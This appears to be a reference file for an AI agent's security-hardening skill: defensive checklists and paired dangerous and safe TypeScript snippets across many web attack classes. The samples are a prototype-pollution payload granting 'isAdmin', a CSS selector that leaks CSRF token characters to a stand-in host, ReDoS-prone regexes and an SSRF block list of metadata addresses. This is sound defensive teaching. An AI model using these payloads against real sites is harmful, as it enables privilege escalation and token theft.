# Turtle Harden: Exotic Attack Vectors Reference

> Loaded by turtle-harden during Phase 4 (SIEGE). See SKILL.md for the full workflow.

Think like an attacker. For each category, attempt the attack mentally (or practically if safe to do so) and verify defenses hold.

---

## 4A. Prototype Pollution

```
CHECK:
[ ] No deep merge/extend operations on user-controlled objects
[ ] Keys like __proto__, constructor, and prototype rejected in object merging
[ ] Object.create(null) used for dictionaries instead of {}
[ ] lodash.merge, jQuery.extend, or similar deep-merge not used with user input
[ ] If deep merge is needed, library is patched/updated for prototype pollution
[ ] Consider Object.freeze(Object.prototype) in sensitive contexts
```

**What to look for:**

```typescript
// DANGEROUS: Deep merging user input
const config = deepMerge(defaults, userInput);
// Attacker sends: { "__proto__": { "isAdmin": true } }
// Now ({}).isAdmin === true for ALL objects

// SAFE: Validate keys before merging
function safeMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (key === "__proto__" || key === "constructor" || key === "prototype")
      continue;
    target[key] = source[key];
  }
  return target;
}
```

---

## 4B. Timing Side-Channel Attacks

```
CHECK:
[ ] Secret/token comparison uses crypto.timingSafeEqual(), not === or ==
[ ] HMAC verification uses constant-time comparison
[ ] Database lookups for auth don't reveal user existence via timing
    (Query for user + verify password even when user doesn't exist)
[ ] API key validation doesn't exit early on mismatch
```

**What to look for:**

```typescript
// DANGEROUS: Early-exit comparison leaks information
if (providedToken === storedToken) { ... }

// SAFE: Constant-time comparison
import { timingSafeEqual } from 'crypto';
const a = Buffer.from(providedToken);
const b = Buffer.from(storedToken);
if (a.length === b.length && timingSafeEqual(a, b)) { ... }
```

---

## 4C. Race Conditions (TOCTOU)

```
CHECK:
[ ] Single-use tokens (coupons, invites, password resets) use atomic operations
    (SELECT FOR UPDATE, or unique constraint + INSERT, not check-then-act)
[ ] Financial operations use database-level locking or transactions
[ ] Rate limiting uses atomic increment (not read-check-write)
[ ] File operations use exclusive locks where needed
[ ] Idempotency keys used for non-idempotent operations
[ ] State transitions validated atomically (can't skip states)
```

**What to look for:**

```typescript
// DANGEROUS: Check-then-act (race condition)
const coupon = await db.query(
  "SELECT * FROM coupons WHERE code = ? AND used = 0",
  [code],
);
if (coupon) {
  await applyDiscount(coupon);
  await db.query("UPDATE coupons SET used = 1 WHERE code = ?", [code]);
  // Two concurrent requests can both pass the check before either updates!
}

// SAFE: Atomic operation
const result = await db.query(
  "UPDATE coupons SET used = 1 WHERE code = ? AND used = 0 RETURNING *",
  [code],
);
if (result.rows.length > 0) {
  await applyDiscount(result.rows[0]);
}
```

---

## 4D. Regular Expression Denial of Service (ReDoS)

```
CHECK:
[ ] No user-supplied regex patterns
[ ] Regex patterns reviewed for catastrophic backtracking
    Dangerous patterns: (a+)+, ([a-zA-Z]+)*, (a|aa)+, (.*a){x}
[ ] Input length limited BEFORE regex evaluation
[ ] Consider RE2 or other non-backtracking engine for user-facing patterns
[ ] Email validation uses a simple pattern, not an RFC-complete monster regex
[ ] URL parsing uses URL() constructor, not regex
```

**What to look for:**

```typescript
// DANGEROUS: Catastrophic backtracking
const emailRegex = /^([a-zA-Z0-9]+)*@([a-zA-Z0-9]+)*\.([a-zA-Z]+)*$/;
// Input: "aaaaaaaaaaaaaaaaaaaaaa" causes exponential backtracking

// SAFE: Simple, non-backtracking validation
const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
// Or better: use a validation library (Zod's z.string().email())
```

---

## 4E. Server-Side Request Forgery (SSRF)

```
CHECK:
[ ] Any URL/hostname from user input validated against strict ALLOWLIST
[ ] IP addresses from DNS resolution validated IMMEDIATELY before connection
    (not separately — DNS rebinding sends different IPs on each resolution)
[ ] RFC 1918 addresses blocked: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
[ ] Loopback blocked: 127.0.0.0/8, [::1], localhost (including decimal/octal/hex variants)
[ ] Link-local blocked: 169.254.0.0/16, [fe80::]/10
[ ] Cloud metadata endpoints blocked: 169.254.169.254, metadata.google.internal
[ ] Redirect following disabled (or redirects re-validated at each hop)
[ ] URL parsing is consistent (no parser confusion between validation and request)
[ ] file://, gopher://, dict://, and other non-HTTP schemes rejected
[ ] IMDSv2 used on AWS (requires session token, blocks SSRF to metadata)
```

---

## 4F. CRLF Injection

```
CHECK:
[ ] CR (\r) and LF (\n) stripped from ALL values used in HTTP headers
[ ] Redirect URLs sanitized (no newlines in Location header)
[ ] Set-Cookie values sanitized
[ ] Custom headers built from user input sanitized
[ ] Log entries sanitized (prevent log injection/forging)
```

---

## 4G. Unicode & Encoding Attacks

```
CHECK:
[ ] Security filters applied AFTER Unicode normalization (NFC/NFKC), not before
[ ] Homoglyph attacks considered for usernames and display names
    (Cyrillic 'a' U+0430 looks identical to Latin 'a' U+0061)
[ ] Bidirectional text characters stripped from code inputs (Trojan Source)
[ ] Zero-width characters stripped from security-sensitive inputs
[ ] Character set allowlists used where possible
[ ] Case-insensitive comparisons use locale-independent methods
```

---

## 4H. Deserialization

```
CHECK:
[ ] JSON.parse() used instead of custom deserialization libraries
[ ] No node-serialize, serialize-to-js, funcster, or similar used with untrusted input
[ ] If custom serialization required: strict schema validation with property allowlist
[ ] Cookie values are JSON, not serialized JavaScript objects
[ ] Webhook payloads validated against expected schema before processing
```

---

## 4I. postMessage Security

```
CHECK:
[ ] All postMessage listeners validate event.origin with EXACT string comparison
    (not regex, not includes(), not startsWith())
[ ] postMessage sends specify EXACT target origin (never "*")
[ ] Message data treated as untrusted input (validated/sanitized)
[ ] Null origin not accepted (sandboxed iframes have null origin)
[ ] No sensitive data sent via postMessage to untrusted origins
```

---

## 4J. WebSocket Security

```
CHECK:
[ ] Origin header validated on every WebSocket handshake
[ ] CSRF tokens used in WebSocket handshake request
[ ] Authentication verified (not relying solely on cookies)
[ ] wss:// used exclusively (never ws://)
[ ] Message size limits enforced
[ ] Rate limiting on WebSocket messages
[ ] All WebSocket message payloads validated (injection prevention)
[ ] Connection limits per user/IP
```

---

## 4K. CSS Injection & Data Exfiltration

```
CHECK:
[ ] User-controlled CSS is not allowed (no custom <style> injection)
[ ] style-src in CSP restricts CSS sources
[ ] HTML sanitization strips <style> tags and style attributes if not needed
[ ] CSRF tokens not in CSS-selectable attribute values
    (CSS: input[value^="a"]{ background: url(leak.com/a) })
[ ] Sensitive form values use type="password" or autocomplete="off" where appropriate
```

---

## 4L. SVG XSS

```
CHECK:
[ ] SVG uploads sanitized with DOMPurify (strip <script>, event handlers, <foreignObject>)
[ ] User-uploaded SVGs served with Content-Type: image/svg+xml (not text/html)
[ ] Or: SVGs served with Content-Disposition: attachment
[ ] Consider converting SVGs to PNG on upload for maximum safety
[ ] SVGs in <img> tags are safe (browsers block script execution)
[ ] SVGs used inline via {@html} must be sanitized
```

---

## 4M. HTTP Request Smuggling & Cache Poisoning

```
CHECK:
[ ] HTTP/2 used end-to-end where possible
[ ] No ambiguous Content-Length / Transfer-Encoding headers
[ ] Cloudflare handles front-end parsing (reduces risk if using CF)
[ ] Cache keys include all security-relevant parameters
[ ] Unkeyed headers (X-Forwarded-Host, X-Forwarded-Scheme) not reflected in responses
[ ] Vary header set appropriately for cached responses
[ ] Cache-Control headers set explicitly (no unintended caching of sensitive responses)
```

---

## 4N. Open Redirects

```
CHECK:
[ ] Redirect URLs validated against allowlist of permitted destinations
[ ] Relative URLs only (reject absolute URLs from user input)
[ ] Or: Parse URL and verify host matches expected domains
[ ] No javascript: or data: schemes in redirect URLs
[ ] redirect_uri in OAuth flows is exact-match (not prefix-match)
```

---

## 4O. HTTP Verb Tampering

```
CHECK:
[ ] Every route explicitly defines allowed methods
[ ] 405 Method Not Allowed returned for unexpected methods
[ ] Authorization middleware applies to ALL methods, not just GET/POST
[ ] HEAD requests don't bypass auth checks
[ ] SvelteKit: Only exported handlers (GET, POST, etc.) are accessible
```

---

## 4P. Second-Order Vulnerabilities

```
CHECK:
[ ] Data retrieved from the database is treated as potentially untrusted
[ ] Stored URLs fetched later go through SSRF validation
[ ] Stored usernames/display names encoded on output (stored XSS prevention)
[ ] Stored values used in SQL queries still use parameterized statements
[ ] Webhook URLs stored by users validated on each use, not just on save
```

---

## 4Q. Supply Chain & Dependency Security

```
CHECK:
[ ] Lock file (pnpm-lock.yaml) committed and reviewed for unexpected changes
[ ] npm audit / pnpm audit run regularly (and in CI)
[ ] No unnecessary dependencies (each dep is an attack surface)
[ ] Dependency versions pinned (no floating ranges in production)
[ ] postinstall scripts reviewed for new dependencies
[ ] Typosquatting checked (package name matches intended package)
[ ] node_modules never committed to version control
```

---

## 4R. Service Worker Risks

```
CHECK:
[ ] Service worker scope restricted to minimum necessary paths
[ ] CSP restricts which scripts can register service workers
[ ] Service worker updates are signed or integrity-checked
[ ] A "kill switch" service worker deployment is documented and tested
[ ] Clear-Site-Data header available for emergency deregistration
```

---

## 4S. DNS & Infrastructure

```
CHECK:
[ ] No dangling DNS records (CNAME to decommissioned services)
[ ] Subdomain takeover risk assessed for all DNS records
[ ] Internal services validate Host header (DNS rebinding defense)
[ ] API keys and tokens in Cloudflare Workers use Workers Secrets (not env vars)
```
